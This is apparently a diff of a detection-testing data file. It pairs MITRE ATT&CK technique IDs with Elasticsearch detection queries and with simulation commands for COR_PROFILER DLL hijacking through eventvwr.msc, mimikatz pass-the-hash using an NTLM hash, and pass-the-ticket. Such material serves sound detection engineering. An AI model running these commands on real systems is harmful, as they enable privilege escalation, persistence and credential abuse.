+New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER"" -PropertyType String -Value ""{09108e71-974c-4010-89cb-acf471ae9e2c}"" -Force | Out-Null; 
+New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER_PATH"" -PropertyType String -Value 83f016_T1574.012x64.dll -Force | Out-Null",0,,
+T1574.012,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""\\Environment""}},
+                {""match_phrase"": {""CommandLine"": ""START""}},
+                {""match_phrase"": {""CommandLine"": ""EVENTVWR.MSC""}},
+                {""match_phrase"": {""CommandLine"": ""MMC.EXE""}},
+                 {""wildcard"": {""CommandLine"": ""*dll""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","Write-Host ""Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}"" -ForegroundColor Cyan; 
+New-Item -Path ""HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32"" -Value 83f016_T1574.012x64.dll -Force | Out-Null;
+New-ItemProperty -Path HKCU:\Environment -Name ""COR_ENABLE_PROFILING"" -PropertyType String -Value ""1"" -Force | Out-Null; 
+New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER"" -PropertyType String -Value ""{09108e71-974c-4010-89cb-acf471ae9e2c}"" -Force | Out-Null; 
+New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER_PATH"" -PropertyType String -Value 83f016_T1574.012x64.dll -Force | Out-Null;
+Write-Host ""executing eventvwr.msc"" -ForegroundColor Cyan; 
+START MMC.EXE EVENTVWR.MSC",0,,
+T1550.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""mimikatz ""}},
+                {""match"": {""CommandLine"": ""sekurlsa""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","%tmp%\mimikatz\x64\mimikatz.exe 
+""sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a""",2,,
+T1550.003,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""mimikatz*""}},
+                 {""match"": {""CommandLine"": ""ptt""}},
+                {""match"": {""CommandLine"": ""kerberos""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","PathToAtomicsFolder\T1550.003\bin\mimikatz.exe ""kerberos::ptt None""",2,,
